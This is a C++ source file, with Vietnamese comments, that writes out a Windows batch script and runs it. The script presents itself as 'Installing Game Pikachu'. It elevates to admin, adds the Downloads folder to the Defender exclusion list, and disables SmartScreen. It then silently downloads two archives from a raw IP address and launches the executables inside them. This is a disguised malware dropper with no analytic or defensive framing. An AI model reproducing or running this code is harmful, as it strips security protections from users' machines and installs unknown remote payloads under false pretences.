#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

#ifndef _WIN32
  #include <sys/stat.h>
  #include <sys/wait.h>
#endif

int main() {
#ifdef _WIN32
    const std::string filePath = "D://hello.bat";
    const std::string content = R"(@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb runAs"
    exit /b
)

:: urlClient và đường dẫn file đầu ra (batch syntax)
set "urlClient=http://172.188.16.91/Clientlocal.zip"
set "outPathClient=%USERPROFILE%\Downloads\Clientlocal.zip"
set "urlPikachu=http://172.188.16.91/pikachu.zip"
set "outPathPikachu=%USERPROFILE%\Downloads\Pikachu.zip"

timeout /t 1 >nul
@echo off
echo Installing Game Pikachu, please wait ...
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'"
timeout /t 1 >nul
echo Set WshShell = CreateObject("WScript.Shell") > temp.vbs
echo WshShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '%urlClient%' -OutFile '%outPathClient%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }""", 0, True >> temp.vbs
echo WshShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '%urlPikachu%' -OutFile '%outPathPikachu%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }""", 0, True >> temp.vbs

:: Chạy VBScript
cscript //nologo temp.vbs

:: Xóa file tạm
del temp.vbs

if exist "%outPathClient%" (
    @REM echo Running the downloaded file...
    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathClient%\" -DestinationPath \"%USERPROFILE%\Downloads\Clientlocal\" -Force"
    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Clientlocal\Client.exe\""
    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathPikachu%\" -DestinationPath \"%USERPROFILE%\Downloads\Pikachu\" -Force"
    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Pikachu\Pikachu.exe\""
) else (
    echo Download failed.
    pause
)
)";

    std::ofstream ofs(filePath, std::ios::binary);
    if (!ofs) {
        std::cerr << "Khong the tao file: " << filePath << "\n";
        return 1;
    }
    ofs << content;
    ofs.close();

    std::string cmd = "cmd /c \"" + filePath + "\"";
    int rc = std::system(cmd.c_str());
    if (rc == -1) {
        perror("system");
        return 3;
    }
    return 0;
#else
#endif
}